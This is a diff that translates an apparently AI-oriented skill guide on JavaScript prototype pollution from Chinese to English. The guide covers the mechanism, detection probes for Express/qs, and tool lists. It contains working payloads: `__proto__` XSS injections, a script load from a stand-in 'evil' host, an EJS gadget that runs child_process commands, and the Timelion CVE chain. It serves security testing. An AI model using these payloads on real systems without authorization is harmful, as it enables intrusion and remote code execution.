@@ -11,7 +11,7 @@ description: >-
 
 > **AI LOAD INSTRUCTION**: Expert prototype pollution for client and server JS. Covers `__proto__` vs `constructor.prototype`, merge-sink detection, Express/qs-style black-box probes, and gadget chains (EJS, Timelion-class patterns, child_process/NODE_OPTIONS). Assumes you know object spread and prototype inheritance — focus is on **parser behavior** and **post-pollution sinks**.
 
-中文路由提示：当存在深度合并、递归 assign、`JSON.parse` 后 `Object.assign`、或 URL 查询被转成嵌套对象时，优先怀疑 PP。
+Routing note: prioritize PP when you see deep merges, recursive assign, `JSON.parse` followed by `Object.assign`, or URL queries converted to nested objects.
 
 ## 0. QUICK START
 
@@ -23,7 +23,7 @@ description: >-
 #constructor[prototype][polluted]=1
 ```
 
-在可反射到 DOM 或框架路由的场景，配合 `alert(1)` / `console` 观察是否全局对象属性被污染。
+When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.
 
 ```text
 #__proto__[xxx]=alert(1)
@@ -39,29 +39,29 @@ description: >-
 {"constructor":{"prototype":{"polluted":true}}}
 ```
 
-发送后检查：后续无关响应是否带上异常头/状态码/JSON 空格，或应用逻辑是否读取到 `Object.prototype.polluted`（见 §3 探测表）。
+After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).
 
 ### Quick boolean
 
-若目标使用 `lodash.merge`、`deep-extend`、`hoek.applyToDefaults`、部分 `qs`/`query-string` 配置，**提高优先级**。
+If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.
 
 ---
 
 ## 1. MECHANISM
 
-**原型链**：访问 `obj.key` 时，若 `obj` 自有属性无 `key`，沿 `[[Prototype]]` 向上查，直至 `Object.prototype`。
+**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.
 
-**`__proto__`**：许多解析器把字面键 `__proto__` 当作「把下面属性接到原型上」的魔法键（`Object.prototype` 的历史可访问属性路径）。合并 `{ "__proto__": { "x": 1 } }` 可能等价于 `Object.prototype.x = 1`（视实现与修复版本而定）。
+**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.
 
-**`constructor.prototype`**：`constructor` 通常指向对象的构造函数；`constructor.prototype` 即该构造器的 `prototype` 对象。对普通对象默认连到 `Object.prototype`。路径如：
+**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:
 
 ```json
 {"constructor":{"prototype":{"polluted":1}}}
 ```
 
-与 `__proto__` 不一定等价（过滤、JSON 解析、Bun/Node 差异），需**双线测试**。
+This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.
 
-**攻击本质**：不是「多传一个参数」，而是**在未隔离的合并算法**里，把可控键指向**原型对象**，使**全局**或**共享模板上下文**获得恶意属性，后续代码「正常」读取该属性即触发 gadget。
+**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.
 
 ---
 
@@ -77,7 +77,7 @@ https://app.example/page#__proto__[admin]=1
 https://app.example/#__proto__[xxx]=alert(1)
 ```
 
-若路由或 analytics 把 fragment 解析进对象再合并，可能污染。
+If router or analytics code parses fragments into objects and then merges, pollution may occur.
 
 ### `constructor.prototype` path
 
@@ -85,66 +85,66 @@ https://app.example/#__proto__[xxx]=alert(1)
 #constructor[prototype][role]=admin
 ```
 
-### DOM / 属性注入思路
+### DOM / attribute injection ideas
 
-框架若把属性名当对象键合并：
+If the framework merges attribute names as object keys:
 
 ```text
 __proto__[src]=//evil/xss.js
 ```
 
-事件处理器型键（实现相关）：
+Event-handler style keys (implementation-dependent):
 
 ```text
 __proto__[onerror]=alert(1)
 ```
 
-**验证**：新开无 fragment 的页面，在控制台检查 `Object.prototype` 是否残留测试键；注意扩展与 DevTools 干扰。
+**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.
 
 ---
 
 ## 3. SERVER-SIDE DETECTION (Express / Node, black-box)
 
-以下载荷假设 body 或 query 被 **qs** 或同类解析器**深度解析**进对象（或与 `body-parser` 组合）。观测**全局副作用**，而非仅当前接口返回值。
+The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.
 
-| Payload（JSON 示意） | 预期可观察信号 |
+| Payload (JSON example) | Expected observable signal |
 |----------------------|----------------|
-| `{"__proto__":{"parameterLimit":1}}` | 后续请求中多参数被忽略或解析异常（`qs` 风格 `parameterLimit`） |
-| `{"__proto__":{"ignoreQueryPrefix":true}}` | `??foo=bar` 类双问号前缀被接受或行为突变 |
-| `{"__proto__":{"allowDots":true}}` | `?foo.bar=baz` 嵌套键按点号展开生效 |
-| `{"__proto__":{"json spaces":" "}}` | JSON 序列化响应出现额外空格（`JSON.stringify` 受污染空格设置影响） |
-| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS 响应出现 `foo` 相关头（若框架从原型读配置） |
-| `{"__proto__":{"status":510}}` | 某条响应状态码变为 510 或异常码（应用从对象读 `status`） |
+| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
+| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
+| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
+| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
+| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
+| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |
 
-**操作要点**：先发污染请求，再发**干净**请求观察是否持久；连接池与 worker 生命周期会影响「是否全局可见」。
+**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.
 
 ---
 
 ## 4. EXPLOITATION GADGETS
 
-| 目标 / 场景 | 载荷或模式 | 备注 |
+| Target / scenario | Payload or pattern | Notes |
 |-------------|------------|------|
-| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | `escapeFunction` 等选项若被模板引擎从受污原型读取，可导向 RCE；版本与配置强相关 |
-| **Timelion 表达式链（CVE-2019-7609）** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | 历史链：原型污染 + 时间线表达式执行；用于理解 **表达式 + PP** 组合 |
-| **Node `child_process`** | 污染 `shell`、`argv0`、`env`、`NODE_OPTIONS` 等（经合并进 `exec`/`fork` 选项对象） | 依赖后续是否 `spawn`/`fork` 且从原型链读取选项 |
-| **通用 constructor 路径** | `{"constructor":{"prototype":{"foo":"bar"}}}` | 绕过仅过滤 `__proto__` 键的弱校验 |
+| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
+| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
+| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
+| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |
 
-**链式思维**：污染 → 某依赖 `obj.settings.xxx` 且未 `hasOwnProperty` → RCE / SSRF / 路径穿越。
+**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.
 
 ---
 
 ## 5. TOOLS
 
-| 项目 | 用途 |
+| Project | Purpose |
 |------|------|
-| **yeswehack/pp-finder** | 辅助定位 PP 易感合并点与模式 |
-| **yuske/silent-spring** | 研究与检测相关原型污染面 |
-| **yuske/server-side-prototype-pollution** | 服务端 PP 测试套件/思路 |
-| **BlackFan/client-side-prototype-pollution** | 浏览器端 PP 案例与 payload |
-| **portswigger/server-side-prototype-pollution** | Burp 生态扩展/配套材料 |
-| **msrkp/PPScan** | 扫描/验证辅助 |
+| **yeswehack/pp-finder** | Helps locate PP-prone merge points and patterns |
+| **yuske/silent-spring** | Research and detection around prototype-pollution surfaces |
+| **yuske/server-side-prototype-pollution** | Server-side PP testing suite/methodology |
+| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
+| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting material |
+| **msrkp/PPScan** | Scanning/verification helper |
 
-优先在**授权**目标上使用；自动化工具可能对状态ful 应用产生副作用。
+Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications.
 
 ---
 
@@ -185,6 +185,6 @@ __proto__[onerror]=alert(1)
 
 ## Related routing
 
-- 输入路由与多类注入并列入口 → [Injection Testing Router](../injection-checking/SKILL.md)。
-- 模板执行链（非 PP）→ [SSTI](../ssti-server-side-template-injection/SKILL.md)。
-- 不安全反序列化（非 JS 原型）→ [Deserialization](../deserialization-insecure/SKILL.md)。
+- Input routing and multi-injection parallel entry -> [Injection Testing Router](../injection-checking/SKILL.md).
+- Template execution chains (non-PP) -> [SSTI](../ssti-server-side-template-injection/SKILL.md).
+- Insecure deserialization (non-JS prototype) -> [Deserialization](../deserialization-insecure/SKILL.md).
